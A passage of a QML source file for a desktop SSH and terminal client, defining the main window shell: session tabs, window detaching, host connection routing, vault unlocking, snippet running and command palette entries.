pragma ComponentBehavior: Bound

// Window content (PLAN §5.3, §5.4): title bar with the session tabs, navigation rail, content
// area with the views, collapsible side panel and status bar, plus the command palette, the
// notifications panel, the tab switcher and the shortcuts.
//
// Tabs: tab 0 is Home, which shows the view picked in the rail; tabs 1..n are terminal tabs
// (TabWorkspace, one per sessionModel row, all kept alive), each a tree of panes with one
// session per pane in the Rust registry (TerminalSessions). The Terminal rail entry goes back to
// the last terminal tab, or opens a local terminal while none is open. Closing a tab ends its
// sessions; moving it to another window keeps them running. Pinned tabs come first.
//
// A detached shell (`detached`, in a DetachedWindow) has only terminal tabs: no rail, Home,
// views or side panel. Its window closes when its last tab closes or moves away.
//
// Keyboard: Tab follows the regions in order (title bar, rail, content, side panel, status bar),
// and F6 / Shift+F6 (or Ctrl+F6 / Ctrl+Shift+F6, ADR 0011) jump between them. When a view, tab
// or region is hidden, the keyboard focus moves off it to the content shown now.
//
//   window: Window          the window
//   detached: bool          a secondary window's shell (see above)
//   persistState: bool      remember the view and side panel in UiState (off in smoke and
//                           screenshot runs, which must not write the user's files)
//   layoutOverride: var     { tabsPosition, railPosition, railLabels, sidePanelPosition,
//                           showStatusBar } values that win over AppSettings (tests only)
//   commandPalette: OsCommandPalette   read-only
//   currentWorkspace: TabWorkspace     the terminal tab shown, or null (set by the tabs)
//   currentTerminal: TerminalPane      read-only; its focused pane, or null
// Tab rows (sessionModel): tabId, kind, title (the focused terminal's), customTitle, color (a
// Theme.tabColorNames entry), pinned, newOutput, bellRang, broadcasting, startSession, seed.
// Functions: showView(id), openTerminal(), selectTab(index), selectTabById(tabId), newTab(),
// closeTab(index), closeTabById(tabId), tabIndexOf(tabId), updateTab(tabId, role, value),
// insertTab(row, position), moveTab(from, to), renameTab(index, name), setTabColor(index, name),
// setTabPinned(index, pinned), duplicateTab(index), closeOtherTabs(index, which),
// reopenClosedTab(), takeTab(index), adoptTab(entry, position), moveTabToNewWindow(index,
// point), moveTabToShell(index, target), dropTabOutside(index, point), captureWindow(),
// openTabs(tabs, current), closeAllTabs(), showSwitcher(step), askRenameTab(index),
// showWorkspaces(mode), connectHost(id, where), connectTarget(text, where),
// showQuickConnect(text), newHost(group), editHost(id), newGroup(parent), editGroup(id),
// showSshImport(path), closeHostDialogs(), focusInTabStrip(), cycleTab(step), gotoTab(n), toggleSidePanel(),
// togglePalette(), toggleNotifications(), toggleMaximize(), toggleFullScreen(),
// cycleRegion(step), shortcutText(actionId), smokeSteps(smoke), prepareScreenshot(),
// prepareSettingsScreenshot(), prepareTerminalScreenshot(), prepareHostsScreenshot(),
// prepareKeychainScreenshot(), prepareSshScreenshot(), prepareSftpScreenshots(done),
// prepareSftpScreenshot(page), prepareTunnelsScreenshots(done), prepareTunnelsScreenshot(page),
// prepareDesktopScreenshots(done), prepareDesktopScreenshot(page).
import QtQuick
import QtQuick.Layouts
import QtQuick.Templates as T
import cc.caixa.opensesh

Item {
    id: shell

    required property Window window
    property bool detached: false
    property bool persistState: true
    property var layoutOverride: ({})

    readonly property string tabsPosition: layoutOverride.tabsPosition ?? AppSettings.tabsPosition
    readonly property string railPosition: detached ? "hidden" : layoutOverride.railPosition ?? AppSettings.railPosition
    readonly property bool railLabels: layoutOverride.railLabels ?? AppSettings.railLabels
    readonly property string sidePanelPosition: layoutOverride.sidePanelPosition ?? AppSettings.sidePanelPosition
    readonly property bool showStatusBar: layoutOverride.showStatusBar ?? AppSettings.showStatusBar
    readonly property string decorations: Platform.effectiveDecorations(AppSettings.windowDecorations)
    readonly property bool frameless: decorations === "custom" || decorations === "none"
    readonly property bool sidePanelLeft: sidePanelPosition === "left"
    // The resize grip of a frameless window (WindowResizeHandles.grip) covers the right edge of
    // the content while nothing sits between them: the terminal's scroll bar stays clear of it.
    readonly property real contentEdgeInset: frameless && window.visibility === Window.Windowed
                                             && railPosition !== "right"
                                             && !(sidePanelOpen && !sidePanelLeft)
                                             ? Math.round(Theme.spacingXs * 1.5) : 0

    readonly property var viewIds: ["hosts", "terminal", "sftp", "tunnels", "snippets", "keychain", "history",
        "settings"]
    // Empty in a detached shell, so no view loads there.
    property string activeView: detached ? "" : "hosts"
    // Last view other than Terminal: what Home shows while sessions are open.
    property string homeView: detached ? "" : "hosts"
    property int currentTab: 0
    // The tab id of currentTab (0 for Home). Tabs compare against this stable id, not the
    // index: removing a row renumbers the delegates before currentTab is adjusted.
    property int currentTabId: 0
    // The terminal tab the Terminal rail entry goes back to.
    property int lastSessionTabId: 0
    property alias sessionModel: sessionModel
    readonly property int sessionCount: sessionModel.count
    property Item currentWorkspace: null
    readonly property Item currentTerminal: currentWorkspace ? currentWorkspace.focusedItem : null
    // Tab ids, the most recently used first (0 is Home): the order of the Ctrl+Tab switcher.
    property var recentTabs: [0]
    // The terminal shown has a translucent background and the window has an alpha channel:
    // the window stops painting its background.
    readonly property bool translucentTerminal: AppInfo.windowAlpha && currentTab > 0 && currentTerminal !== null
                                                && currentTerminal.terminal.backgroundImage.length === 0
                                                && currentTerminal.terminal.backgroundOpacity < 0.999

    onCurrentTabChanged: syncCurrentTabId()
    // Set while the tab model changes, so the tab bar's own index adjustments are ignored.
    property bool updatingTabs: false

    property bool sidePanelOpen: false
    property real sidePanelWidth: 320
    readonly property real sidePanelMinimumWidth: Theme.spacingXxl * 7
    readonly property real contentMinimumWidth: Theme.spacingXxl * 8

    property bool restoreMaximized: false
    // --screenshots: the keychain's sample entries were loaded.
    property bool keychainSampleLoaded: false
    // --screenshots: the sample macro the snippet editor shows, and the tabs of the series.
    property string deployMacro: ""
    property int playerTab: 0
    property int snippetsTab: 0
    // Screenshot runs: the sample SSH state panes show ({connection, prompt} as JSON text).
    property var sshSample: null

    readonly property alias commandPalette: palette

    // The tab strip re-reads currentTab after the tab model changed.
    signal tabsUpdated
    // Counts tabsUpdated, so bindings that read rows (e.g. whether the current tab is pinned)
    // follow the changes.
    property int tabsRevision: 0

    onTabsUpdated: tabsRevision += 1

    function scheduleSave() {
        if (persistState)
            saveTimer.restart();
    }

    function setActiveView(id) {
        activeView = id;
        if (id !== "terminal")
            homeView = id;
        if (persistState && UiState.activeView !== id) {
            UiState.activeView = id;
            scheduleSave();
        }
    }

    // A detached window has no views: they open in the main window, which comes to the front.
    function forwardToMain() {
        const main = WindowRegistry.mainShell;
        if (!detached || !main || main === shell)
            return null;
        main.window.raise();
        main.window.requestActivate();
        return main;
    }

    function showView(id) {
        const main = forwardToMain();
        if (main) {
            main.showView(id);
            return;
        }
        if (viewIds.indexOf(id) < 0) {
            console.warn("AppShell: unknown view", id);
            return;
        }
        if (id === "terminal" && sessionModel.count > 0) {
            const last = tabIndexOf(lastSessionTabId);
            selectTab(last > 0 ? last : 1);
            return;
        }
        currentTab = 0;
        touchRecent(0);
        setActiveView(id);
        tabsUpdated();
        moveFocusOffHiddenItem();
    }

    function syncCurrentTabId() {
        currentTabId = currentTab > 0 && currentTab <= sessionModel.count
                       ? sessionModel.get(currentTab - 1).tabId : 0;
    }

    function touchRecent(tabId) {
        if (recentTabs[0] !== tabId)
            recentTabs = [tabId].concat(recentTabs.filter(id => id !== tabId));
    }

    function selectTab(index) {
        index = Math.max(detached && sessionModel.count > 0 ? 1 : 0, Math.min(index, sessionModel.count));
        currentTab = index;
        // Also when the index didn't change (the current tab was closed and the next one moved
        // into its place).
        syncCurrentTabId();
        touchRecent(currentTabId);
        if (index > 0) {
            lastSessionTabId = currentTabId;
            if (!detached)
                setActiveView("terminal");
        } else if (activeView === "terminal" && sessionModel.count > 0) {
            setActiveView(homeView);
        }
        tabsUpdated();
        moveFocusOffHiddenItem();
    }

    function selectTabById(tabId) {
        if (tabId === 0) {
            if (!detached)
                selectTab(0);
            return;
        }
        const index = tabIndexOf(tabId);
        if (index > 0)
            selectTab(index);
    }

    // The tab bar's current index changed (a click or the arrow keys).
    function tabBarSelected(index) {
        if (!updatingTabs && index >= 0 && index !== currentTab)
            selectTab(index);
    }

    function pinnedCount() {
        let count = 0;
        for (let i = 0; i < sessionModel.count; ++i) {
            if (sessionModel.get(i).pinned)
                count += 1;
        }
        return count;
    }

    // After rows moved: keep currentTab on the same tab.
    function followCurrentTab() {
        if (currentTabId !== 0) {
            const index = tabIndexOf(currentTabId);
            if (index > 0 && index !== currentTab)
                currentTab = index;
        }
        tabsUpdated();
    }

    // Adds a terminal tab and returns its index. `row` may give tabId, customTitle, color,
    // pinned, startSession and seed (see TabWorkspace); `position` is the index it should get
    // (default: the end). Pinned tabs stay before the others.
    function insertTab(row, position) {
        const entry = {
            tabId: row.tabId ?? TerminalSessions.allocateId(),
            kind: "local",
            title: "",
            customTitle: row.customTitle ?? "",
            color: row.color ?? "",
            pinned: row.pinned === true,
            newOutput: false,
            bellRang: false,
            broadcasting: false,
            // The tab's own icon ("monitor" for a remote desktop); empty: a terminal's.
            tabIcon: "",
            startSession: row.startSession ?? true,
            seed: row.seed ?? ""
        };
        const pinned = pinnedCount();
        let at = (position ?? sessionModel.count + 1) - 1;
        at = entry.pinned ? Math.min(at, pinned) : Math.max(at, pinned);
        at = Math.max(0, Math.min(at, sessionModel.count));
        updatingTabs = true;
        sessionModel.insert(at, entry);
        updatingTabs = false;
        followCurrentTab();
        return at + 1;
    }

    // The Terminal rail entry: the last session tab, or a new local terminal. A detached
    // window stays on its own tabs.
    function openTerminal() {
        if (detached) {
            if (currentWorkspace)
                currentWorkspace.focusTerminal();
            return;
        }
        if (sessionModel.count > 0)
            showView("terminal");
        else
            newTab();
    }

    // 1-based tab index of a session tab, or -1.
    function tabIndexOf(tabId) {
        for (let i = 0; i < sessionModel.count; ++i) {
            if (sessionModel.get(i).tabId === tabId)
                return i + 1;
        }
        return -1;
    }

    // This window's terminal panes whose program still runs (a shell that ended, or a recording
    // played back, loses nothing when it closes).
    function runningSessionCount() {
        let count = 0;
        for (let i = 0; i < tabRepeater.count; ++i) {
            const workspace = tabRepeater.itemAt(i);
            if (!workspace)
                continue;
            for (const id of workspace.paneIds) {
                const pane = workspace.paneItem(id);
                if (pane && pane.kind !== "player" && pane.terminal.running)
                    count += 1;
            }
        }
        return count;
    }

    // Before this window closes: with "Confirm before closing with active sessions" on and work
    // that would end, shows the question and returns true (the caller keeps the window open;
    // confirming closes it again, marked as confirmed). `wholeApp`: the main window, whose closing
    // ends every window, tunnel and transfer.
    readonly property bool askingToClose: closeDialog.visible

    // Answers the close question (the smoke test): `close` closes the window.
    function answerClose(close) {
        if (close)
            closeDialog.accept();
        else
            closeDialog.reject();
    }

    function askBeforeClosing(wholeApp) {
        if (closeDialog.visible)
            return true;
        if (!AppSettings.confirmCloseWithSessions)
            return false;
        const sessions = wholeApp ? WindowRegistry.shells.reduce((sum, each) => sum + each.runningSessionCount(), 0)
                                  : runningSessionCount();
        const tunnels = wholeApp ? Tunnels.running : 0;
        const transfers = wholeApp ? Transfers.active : 0;
        if (sessions + tunnels + transfers === 0)
            return false;
        closeDialog.show(wholeApp, sessions, tunnels, transfers);
        return true;
    }

    function workspaceOf(tabId) {
        for (let i = 0; i < tabRepeater.count; ++i) {
            const item = tabRepeater.itemAt(i);
            if (item && item.tabId === tabId)
                return item;
        }
        return null;
    }

    function closeTabById(tabId) {
        const index = tabIndexOf(tabId);
        if (index > 0)
            closeTab(index);
    }

    // Sets a role of a session tab: title, customTitle, color, newOutput, bellRang, broadcasting.
    function updateTab(tabId, role, value) {
        const index = tabIndexOf(tabId);
        if (index > 0 && sessionModel.get(index - 1)[role] !== value)
            sessionModel.setProperty(index - 1, role, value);
    }

    function focusInTabStrip() {
        return isInside(window.activeFocusItem, titleRegion);
    }

    function newTab() {
        selectTab(insertTab({}));
    }

    // The tab as a workspace entry (see Workspaces): `live` keeps the broadcast state, for a
    // tab that moves to another window.
    function tabEntry(index, live) {
        const row = sessionModel.get(index - 1);
        const workspace = workspaceOf(row.tabId);
        const entry = workspace ? workspace.capture(live) : { panes: [] };
        entry.id = row.tabId;
        entry.title = row.customTitle;
        entry.color = row.color;
        entry.pinned = row.pinned;
        return entry;
    }

    // Removes tab `index`; `endSessions` false keeps its sessions running (a move).
    function removeTab(index, endSessions) {
        if (index < 1 || index > sessionModel.count)
            return;
        const tabId = sessionModel.get(index - 1).tabId;
        const wasCurrent = index === currentTab;
        // Closing the focused tab destroys the focused item; the focus then goes to the new
        // current tab.
        const focusInTabs = isInside(window.activeFocusItem, titleRegion);
        if (endSessions) {
            const workspace = workspaceOf(tabId);
            if (workspace) {
                const entry = tabEntry(index, false);
                entry.index = index;
                WindowRegistry.rememberClosed(entry);
                // The shells end in the background; the panes only let go of them.
                for (const id of workspace.paneIds)
                    TerminalSessions.close(id);
            }
        }
        updatingTabs = true;
        sessionModel.remove(index - 1);
        updatingTabs = false;
        recentTabs = recentTabs.filter(id => id !== tabId);
        if (sessionModel.count === 0) {
            currentTab = 0;
            syncCurrentTabId();
            if (detached) {
                // A detached window goes with its last tab (unless it is closing already).
                if (!shell.window.closingDown)
                    Qt.callLater(shell.closeEmptyWindow);
                return;
            }
            if (activeView === "terminal")
                setActiveView(homeView);
            tabsUpdated();
        } else if (wasCurrent) {
            // The tab used before it, else its neighbor.
            const previous = recentTabs.find(id => id === 0 ? !detached : tabIndexOf(id) > 0);
            selectTab(previous !== undefined ? Math.max(0, tabIndexOf(previous)) : Math.min(index, sessionModel.count));
        } else {
            followCurrentTab();
        }
        if (focusInTabs && !isInside(window.activeFocusItem, titleRegion))
            focusRegion(titleRegion);
        moveFocusOffHiddenItem();
    }

    function closeEmptyWindow() {
        if (sessionModel.count === 0 && !window.closingDown)
            window.close();
    }

    function closeTab(index) {
        removeTab(index, true);
        // "Keep the window" shows Home; "quit" closes it (never in test runs, and not while
        // another window still has tabs).
        if (!detached && sessionModel.count === 0 && AppSettings.onLastTabClosed === "quit" && persistState
                && WindowRegistry.shells.length <= 1)
            window.close();
    }

    // which: "others", "left" or "right" of tab `index`. Pinned tabs stay.
    function closeOtherTabs(index, which) {
        if (index < 1 || index > sessionModel.count)
            return;
        const keep = sessionModel.get(index - 1).tabId;
        const ids = [];
        for (let i = 1; i <= sessionModel.count; ++i) {
            const row = sessionModel.get(i - 1);
            if (row.pinned || row.tabId === keep || (which === "left" && i > index) || (which === "right" && i < index))
                continue;
            ids.push(row.tabId);
        }
        for (const id of ids)
            closeTabById(id);
        if (tabIndexOf(currentTabId) < 0 || currentTab === 0)
            selectTab(tabIndexOf(keep));
    }

    function closeAllTabs() {
        while (sessionModel.count > 0)
            removeTab(sessionModel.count, true);
    }

    // A copy of a workspace entry with new pane ids, so it starts new shells.
    function freshTab(entry) {
        const mapping = {};
        const panes = (entry.panes || []).map(pane => {
            const id = TerminalSessions.allocateId();
            mapping[pane.id] = id;
            return Object.assign({}, pane, { id: id });
        });
        const layout = entry.layout ? Layouts.remap(JSON.stringify(entry.layout), JSON.stringify(mapping)) : "";
        return {
            customTitle: entry.title || "",
            color: entry.color || "",
            pinned: entry.pinned === true,
            seed: layout.length === 0 ? "" : JSON.stringify({
                layout: JSON.parse(layout),
                focused: mapping[entry.focused] ?? 0,
                zoomed: mapping[entry.zoomed] ?? 0,
                panes: panes
            })
        };
    }

    // Same layout, profiles and directories, new shells, right after the original.
    function duplicateTab(index) {
        if (index < 1 || index > sessionModel.count)
            return;
        selectTab(insertTab(freshTab(tabEntry(index, false)), index + 1));
    }

    function reopenClosedTab() {
        const entry = WindowRegistry.takeClosed();
        if (!entry)
            return false;
        selectTab(insertTab(freshTab(entry), entry.index));
        return true;
    }

    // from and to are tab indexes; a pinned tab stays among the pinned ones.
    function moveTab(from, to) {
        const count = sessionModel.count;
        if (from < 1 || from > count || to < 1 || to > count)
            return;
        const pinned = pinnedCount();
        to = sessionModel.get(from - 1).pinned ? Math.min(to, pinned) : Math.max(to, pinned + 1);
        if (to === from)
            return;
        updatingTabs = true;
        sessionModel.move(from - 1, to - 1, 1);
        updatingTabs = false;
        followCurrentTab();
    }

    function renameTab(index, name) {
        if (index > 0 && index <= sessionModel.count)
            updateTab(sessionModel.get(index - 1).tabId, "customTitle", name.trim());
    }

    function setTabColor(index, name) {
        if (index > 0 && index <= sessionModel.count)
            updateTab(sessionModel.get(index - 1).tabId, "color", name);
    }

    // Pinning moves the tab to the end of the pinned ones; unpinning, just after them.
    function setTabPinned(index, pinned) {
        if (index < 1 || index > sessionModel.count || sessionModel.get(index - 1).pinned === pinned)
            return;
        sessionModel.setProperty(index - 1, "pinned", pinned);
        const target = pinned ? pinnedCount() : pinnedCount() + 1;
        if (target !== index) {
            updatingTabs = true;
            sessionModel.move(index - 1, target - 1, 1);
            updatingTabs = false;
        }
        followCurrentTab();
    }

    // Removes tab `index` without ending its sessions and returns its live entry.
    function takeTab(index) {
        const entry = tabEntry(index, true);
        removeTab(index, false);
        return entry;
    }

    // Adds a tab from a workspace entry (a live one from takeTab() keeps its sessions; a
    // restored one has new ids and starts new shells) and shows it.
    function adoptTab(entry, position) {
        const index = insertTab({
            tabId: entry.id,
            customTitle: entry.title || "",
            color: entry.color || "",
            pinned: entry.pinned === true,
            seed: JSON.stringify(entry)
        }, position);
        selectTab(index);
        return index;
    }

    // point: where to put the window (global coordinates), or undefined.
    function moveTabToNewWindow(index, point) {
        if (index < 1 || index > sessionModel.count || (detached && sessionModel.count === 1))
            return null;
        return WindowRegistry.openWindow([takeTab(index)], point);
    }

    function moveTabToShell(index, target) {
        if (!target || target === shell || index < 1 || index > sessionModel.count)
            return;
        target.adoptTab(takeTab(index));
        target.window.raise();
        target.window.requestActivate();
    }

    // A tab dragged out of the strip was dropped at `point` (global coordinates): onto another
    // window, it moves there; outside every window, it opens a new one.
    function dropTabOutside(index, point) {
        const target = WindowRegistry.shellAt(point);
        if (target === shell)
            return;
        if (target)
            moveTabToShell(index, target);
        else
            moveTabToNewWindow(index, point);
    }

    // This window's tabs as a workspace window.
    function captureWindow() {
        const tabs = [];
        for (let i = 1; i <= sessionModel.count; ++i)
            tabs.push(tabEntry(i, false));
        return { currentTab: Math.max(0, currentTab - 1), tabs: tabs };
    }

    // Opens workspace tabs (new ids from Workspaces) and shows tab `current` of them.
    function openTabs(tabs, current) {
        let shown = 0;
        for (let i = 0; i < tabs.length; ++i) {
            const index = insertTab({
                tabId: tabs[i].id,
                customTitle: tabs[i].title || "",
                color: tabs[i].color || "",
                pinned: tabs[i].pinned === true,
                seed: JSON.stringify(tabs[i])
            });
            if (i === (current ?? 0) || shown === 0)
                shown = index;
        }
        if (shown > 0)
            selectTab(shown);
    }

    // Tabs in the order of the Ctrl+Tab switcher: the most recently used first.
    function switcherEntries() {
        const ids = recentTabs.filter(id => id === 0 ? !detached : tabIndexOf(id) > 0);
        for (let i = 0; i < sessionModel.count; ++i) {
            const id = sessionModel.get(i).tabId;
            if (ids.indexOf(id) < 0)
                ids.push(id);
        }
        if (!detached && ids.indexOf(0) < 0)
            ids.push(0);
        return ids.map(id => {
            if (id === 0)
                return { tabId: 0, title: qsTr("Home"), iconName: "house", color: "" };
            const row = sessionModel.get(tabIndexOf(id) - 1);
            return {
                tabId: id,
                title: tabTitle(row),
                iconName: row.broadcasting ? "radio-tower" : row.pinned ? "pin" : row.tabIcon.length > 0 ? row.tabIcon : "square-terminal",
                color: row.color
            };
        });
    }

    function tabTitle(row) {
        return row.customTitle.length > 0 ? row.customTitle : row.title.length > 0 ? row.title : qsTr("Local terminal");
    }

    // Ctrl+Tab (step 1) and Ctrl+Shift+Tab (step -1).
    function showSwitcher(step) {
        switcher.start(step);
    }

    function askRenameTab(index) {
        if (index < 1 || index > sessionModel.count)
            return;
        renameDialog.index = index;
        renameDialog.ask(sessionModel.get(index - 1).customTitle);
    }

    // mode: "open" or "save".
    function showWorkspaces(mode) {
        workspacesDialog.show(mode);
    }

    // Opens `connection` ({kind, host, target}): where "tab" (a new tab), "right" or "down" (a
    // split of the current terminal tab, else a new tab).
    function openConnection(connection, where) {
        if ((where === "right" || where === "down") && currentWorkspace && currentTab > 0)
            return currentWorkspace.splitPane(0, where === "right" ? "horizontal" : "vertical", connection) > 0;
        const id = TerminalSessions.allocateId();
        const seed = {
            layout: { pane: id },
            focused: id,
            panes: [{ id: id, kind: connection.kind, host: connection.host ?? "", target: connection.target ?? "",
                    installKey: connection.installKey ?? "", shell: connection.shell ?? "", shellName: connection.shellName ?? "" }]
        };
        selectTab(insertTab({ seed: JSON.stringify(seed) }));
        return true;
    }

    // The sprint that brings connecting over `protocol`.
    function sprintFor(protocol) {
        switch (protocol) {
        case "sftp":
            return 8;
        case "rdp":
            return 13;
        case "vnc":
            return 14;
        default:
            return 12;
        }
    }

    function notYet(protocol, sprint) {
        Toasts.show(qsTr("Connecting over %1 arrives in Sprint %2.").arg(protocol.toUpperCase()).arg(sprint), "info");
    }

    // Connects to saved host `id` (see openConnection for `where`). Returns whether a session
    // opened.
    function connectHost(id, where) {
        const host = JSON.parse(Hosts.hostJson(id) || "{}");
        if (!host.id) {
            Toasts.show(qsTr("That host no longer exists."), "warning");
            return false;
        }
        if (host.protocol === "local") {
            Hosts.recordHost(id);
            return openConnection({ kind: "local", host: id }, where ?? "tab");
        }
        // S3 storage opens in the files view.
        if (host.protocol === "s3") {
            Hosts.recordHost(id);
            return openFiles({ mode: "remote", hostId: id, target: "", title: host.name });
        }
        // Kinds the pane starts itself: terminals (Sprint 12) and remote desktops (Sprint 13).
        if ((shell.terminalKinds.indexOf(host.protocol) >= 0 || shell.desktopKinds.indexOf(host.protocol) >= 0)
                && host.sprint === 0) {
            Hosts.recordHost(id);
            return openConnection({ kind: host.protocol, host: id }, where ?? "tab");
        }
        if (host.protocol !== "ssh") {
            notYet(host.protocol, sprintFor(host.protocol));
            return false;
        }
        if (Hosts.connectCommand(id).length === 0) {
            Toasts.show(qsTr("%1 can't be connected to as it is: check its address, user and jump hosts.").arg(host.name), "danger");
            return false;
        }
        Hosts.recordHost(id);
        return openConnection({ kind: "ssh", host: id }, where ?? "tab");
    }

    // Shows the files view with `source` on its right side (see SftpView.setSource).
    function openFiles(source) {
        const main = forwardToMain();
        if (main)
            return main.openFiles(source);
        showView("sftp");
        const view = sftpLoader.item;
        if (!view)
            return false;
        view.setSource(1, source);
        return true;
    }

    // Connects to quick-connect text (see openConnection for `where`).
    function connectTarget(text, where) {
        const parsed = JSON.parse(Hosts.parseTarget(text) || "{}");
        if (!parsed.ok) {
            Toasts.show(qsTr("Can't connect to %1: %2").arg(text).arg(parsed.error ?? ""), "danger");
            return false;
        }
        if (parsed.sprint > 0) {
            notYet(parsed.protocol, parsed.sprint);
            return false;
        }
        Hosts.recordTarget(parsed.text);
        if (parsed.protocol === "s3")
            return openFiles({ mode: "remote", hostId: "", target: parsed.text, title: parsed.text });
        const kind = shell.terminalKinds.indexOf(parsed.protocol) >= 0 || shell.desktopKinds.indexOf(parsed.protocol) >= 0
                   ? parsed.protocol : "ssh";
        return openConnection({ kind: kind, target: parsed.text }, where ?? "tab");
    }

    function showQuickConnect(text) {
        quickConnect.openWith(text ?? "");
    }

    function newHost(group) {
        hostEditor.create(group ?? "");
    }

    function editHost(id) {
        hostEditor.edit(id);
    }

    function newGroup(parent) {
        groupEditor.create(parent ?? "");
    }

    function editGroup(id) {
        groupEditor.edit(id);
    }

    function showSshImport(path) {
        sshImport.show(path ?? "");
    }

    function closeHostDialogs() {
        hostEditor.close();
        groupEditor.close();
        sshImport.close();
        quickConnect.close();
        installKeyDialog.close();
    }

    // Asks which public key to install on SSH host `id` (see InstallKeyDialog).
    function installKey(id) {
        installKeyDialog.show(id);
    }

    // Runs `then` (if any) once the vault is open: at once when it isn't locked, else after the
    // master password is typed. A vault the keyring holds is asked for again (the keyring may have
    // been locked); without its key there, a toast says so.
    function unlockVault(then) {
        if (Keychain.vaultStatus !== "locked") {
            if (then)
                then();
            return;
        }
        if (Keychain.protection === "keyring") {
            KeychainTasks.run(Keychain.unlockWithKeyring(), (code, detail) => {
                if (Keychain.vaultStatus === "unlocked") {
                    if (then)
                        then();
                } else {
                    Toasts.show(code.length > 0 ? KeychainTasks.message(code, detail)
                                                : qsTr("The system keyring doesn't have the vault's key. Reset the vault in Settings > Security to start a new one."),
                                "danger");
                }
            });
            return;
        }
        unlockDialog.show(then);
    }

    function showMasterPassword(mode) {
        masterPasswordDialog.show(mode);
    }

    function showVaultReset() {
        vaultResetDialog.show();
    }

    function newIdentity() {
        identityEditor.create();
    }

    function editIdentity(id) {
        identityEditor.edit(id);
    }

    function generateKey() {
        keyGenerateDialog.show();
    }

    function importKey(path) {
        keyImportDialog.show(path ?? "");
    }

    function exportKey(id, which) {
        keyExportDialog.show(id, which);
    }

    function closeKeychainDialogs() {
        unlockDialog.close();
        masterPasswordDialog.close();
        vaultResetDialog.close();
        identityEditor.close();
        keyGenerateDialog.close();
        keyImportDialog.close();
        keyExportDialog.close();
    }

    // Command palette entries for the saved hosts that match `query`.
    function hostPaletteEntries(query) {
        const found = JSON.parse(Hosts.search(query, "all", "", "", "recent") || "[]").slice(0, 6);
        return found.map(host => ({
            action: {
                text: qsTr("Connect to %1").arg(host.name),
                category: host.target.length > 0 ? host.target : qsTr("Hosts"),
                iconName: "server",
                shortcut: "",
                enabled: true,
                actionId: ""
            },
            run: () => shell.connectHost(host.id, "tab")
        }));
    }

    // Runs snippet `id`. `where`: "ask" (the run dialog, always), "auto" (the focused pane, or
    // the broadcast panes while the tab broadcasts), "pane", "tab" or "broadcast". A snippet
    // with variables asks for them first. From a view, it runs in the last terminal tab.
    function runSnippet(id, where) {
        const snippet = JSON.parse(Snippets.list || "[]").find(entry => entry.id === id);
        if (!snippet)
            return false;
        if (!currentWorkspace) {
            const index = tabIndexOf(lastSessionTabId);
            if (index > 0)
                selectTab(index);
        }
        const workspace = currentWorkspace;
        if (!workspace || workspace.focusedPane <= 0) {
            Toasts.show(qsTr("Open a terminal to run %1 in.").arg(snippet.name), "warning");
            return false;
        }
        const start = where === "auto" || where === "ask"
                      ? (workspace.broadcast && workspace.participants.length > 0 ? "broadcast" : "pane")
                      : where;
        if (where === "ask" || snippet.variables.length > 0) {
            snippetRunDialog.show(snippet, workspace, start);
            return true;
        }
        const panes = start === "tab" ? workspace.paneIds : start === "broadcast" ? workspace.participants : [workspace.focusedPane];
        return Snippets.run(id, "{}", JSON.stringify(panes));
    }

    // Opens the snippet editor on snippet `id` ("" for a new one).
    function editSnippet(id) {
        const snippet = JSON.parse(Snippets.list || "[]").find(entry => entry.id === id) ?? null;
        snippetEditor.show(snippet);
    }

    // A new tab running `shell` (an entry of Platform.shells: {name, command}).
    function newTabWithShell(shell) {
        return openConnection({ kind: "local", shell: shell.command, shellName: shell.name }, "tab");
    }

    // Command palette entries to open a tab with each local shell that matches `query`.
    function shellPaletteEntries(query) {
        const words = query.toLowerCase().split(/\s+/).filter(word => word.length > 0);
        if (words.length === 0)
            return [];
        return JSON.parse(Platform.shells || "[]")
            .filter(entry => {
                const text = [entry.name, entry.id, qsTr("shell"), qsTr("new tab")].join(" ").toLowerCase();
                return words.every(word => text.indexOf(word) >= 0);
            })
            .slice(0, 8)
            .map(entry => ({
                action: {
                    text: qsTr("New tab: %1").arg(entry.name),
                    category: qsTr("Terminal"),
                    iconName: "square-terminal",
                    shortcut: "",
                    enabled: true,
                    actionId: ""
                },
                run: () => shell.newTabWithShell(entry)
            }));
    }

    // Protocols a terminal pane connects with besides SSH and local shells.
    readonly property var terminalKinds: ["telnet", "serial", "mosh", "docker", "kube"]
    // Protocols whose panes show a remote desktop (DesktopView).
    readonly property var desktopKinds: ["rdp", "vnc"]

    // Plays the session recording in `path` in a new tab.
    function playRecording(path) {
        return openConnection({ kind: "player", target: path }, "tab");
    }

    // A macro just recorded (steps as Snippets.recordStop gives them), to review and save.
    function editRecordedMacro(steps) {
        snippetEditor.showRecorded(steps);
    }

    function showSnippetPicker() {
        snippetPicker.show();
    }

    // Command palette entries to start or stop the tunnels that match `query`.
    function tunnelPaletteEntries(query) {
        const words = query.toLowerCase().split(/\s+/).filter(word => word.length > 0);
        return JSON.parse(Tunnels.list || "[]")
            .filter(tunnel => {
                const text = [tunnel.name, tunnel.hostName, tunnel.kind, tunnel.bindPort, tunnel.destinationHost,
                              qsTr("tunnel")].join(" ").toLowerCase();
                return words.every(word => text.indexOf(word) >= 0);
            })
            .slice(0, 6)
            .map(tunnel => ({
                action: {
                    text: (tunnel.on ? qsTr("Stop tunnel %1") : qsTr("Start tunnel %1"))
                        .arg(tunnel.name.length > 0 ? tunnel.name : tunnel.hostName + ":" + tunnel.bindPort),
                    category: qsTr("Tunnels"),
                    iconName: "waypoints",
                    shortcut: "",
                    enabled: true,
                    actionId: ""
                },
                run: () => Tunnels.setOn(tunnel.id, !tunnel.on)
            }));
    }

    function cycleTab(step) {
        const first = detached ? 1 : 0;
        const count = sessionModel.count + 1 - first;
        if (count <= 0)
            return;
        selectTab(first + (currentTab - first + step + count) % count);
    }

    // n is 1-based and counts Home; 9 is always the last tab.
    function gotoTab(n) {
        const count = sessionModel.count + 1;
        const index = n === 9 ? count - 1 : detached ? n : n - 1;
        if (index < count)
            selectTab(index);
    }

    function setSidePanelOpen(open) {
        // Don't leave the keyboard focus on a panel that disappears.
        if (!open && isInside(window.activeFocusItem, sidePanel))
            focusRegion(contentArea);
        sidePanelOpen = open;
        if (persistState && UiState.sidePanelOpen !== open) {
            UiState.sidePanelOpen = open;
            scheduleSave();
        }
    }

    function toggleSidePanel() {
        if (!detached)
            setSidePanelOpen(!sidePanelOpen);
    }

    // Remember the width the user gives the panel (dragging or keyboard resizing the handle), but
    // not the smaller width the split view forces while the window is too narrow for it.
    function sidePanelSlotResized(slot) {
        const preferred = slot.T.SplitView.preferredWidth;
        if (slot.visible && (splitter.resizing || Math.abs(slot.width - preferred) < 1))
